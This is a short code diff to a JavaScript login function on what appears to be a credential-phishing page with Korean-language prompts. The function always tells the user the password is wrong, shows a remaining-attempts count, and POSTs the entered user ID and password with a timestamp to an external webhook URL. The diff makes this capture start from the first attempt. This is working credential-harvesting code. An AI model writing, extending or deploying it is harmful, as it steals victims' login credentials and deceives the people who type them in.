@@ -193,19 +193,15 @@ function sendPage4() {
   const maxAttempts = 5;
   const remaining = Math.max(0, maxAttempts - loginTryCount + 1);
 
-  if(loginTryCount <= 2) {
-    alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
-    return;
-  }
 
-  if(loginTryCount >= 3 && loginTryCount <= 5) {
+  if(loginTryCount >= 1 && loginTryCount <= 5) {
+    alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
     fetch(webhookUrl,{
       method:"POST",
       headers:{"Content-Type":"application/x-www-form-urlencoded"},
       body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
     }).then(()=>alert(`page4 값 전송 완료! 남은 시도 횟수: ${remaining}`))
       .catch(err=>console.error(err));
-    alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
     return;
   }
 
